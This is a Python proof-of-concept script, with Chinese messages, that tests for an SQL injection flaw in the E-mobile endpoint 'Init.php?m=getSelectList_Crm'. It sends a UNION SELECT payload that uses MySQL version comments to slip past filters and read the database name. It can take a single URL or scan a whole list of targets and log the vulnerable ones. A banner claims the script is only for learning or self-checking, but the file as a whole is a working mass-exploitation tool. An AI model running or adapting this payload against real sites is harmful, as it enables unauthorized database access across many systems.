#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Copyright (C) 2023 lyangdn. All Rights Reserved 
#
# @Time    : 2023/10/26
# @Author  : lyangdn
# @Software: PyCharm

import requests
import argparse
from datetime import datetime
import time
import os
requests.packages.urllib3.disable_warnings()

BULE_BOLD = "\033[1;34m"
RESET = "\033[0m"
RED_BOLD = "\033[1;31m"

def Copyright():
    global BULE_BOLD
    global RED_BOLD
    global RESET
    text = f'''
    此脚本仅用于学习或系统自检查
    使用方法:
        单个 python3 {os.path.basename(__file__)} -u url
        批量 python3 {os.path.basename(__file__)} -f filename
        导出指定文件 python3 {os.path.basename(__file__)} -o outfilename 
        默认导出文件名为：result.txt
    开始rush B................................
    '''
    print(f"\t{RED_BOLD}{BULE_BOLD}{text}{RESET}")

def poc(input_url,outfile):
    now_poc = datetime.now()
    url=input_url+"/E-mobile/App/Init.php?m=getSelectList_Crm"
    data={
        "cc_parent_id":"-999 /*!50000union*/ /*!50000select*/ 1,database()#"
    }
    header={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        "Cookie":"LOGIN_LANG = cn;PHPSESSID = 9276db67eb98c71bdeca5f3af20ee91e"
    }
    try:
        res=requests.post(url=url,data=data,headers=header,timeout=5,verify=False)
        if res.status_code==200 and "NAME" in res.text:
            print(f'{BULE_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{input_url}\tSQL注入漏洞存在{RESET}')
            save_file(url,outfile)
        else:
            print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{input_url}\t漏洞不存在')
    except Exception as e:
        print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{input_url}\t无法访问，请检查目标站点是否存在')

def save_file(url,outfile):
    with open(outfile, mode='a', encoding='utf-8') as f:
        f.write(url + '\n')

def run(filepath,outfile):
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u
        poc(url,outfile)

def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help=f"{os.path.basename(__file__)} -u url")
    parse.add_argument("-f", "--file", help=f"{os.path.basename(__file__)} -f file")
    parse.add_argument("-o", "--outfile", default="result.txt", help=f"{os.path.basename(__file__)} -o file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    outfile=args.outfile
    Copyright()
    time.sleep(2)
    if url is not None and filepath is None:
        if "http" in url or "https" in url:
            poc(url, outfile)
        else:
            print(f"{BULE_BOLD}\turl没有加上http头部，已经为你自动添加http头{RESET}")
            url = "http://" + url
            poc(url, outfile)
    elif url is None and filepath is not None:
        run(filepath, outfile)
    else:
        return


if __name__ == '__main__':
    main()
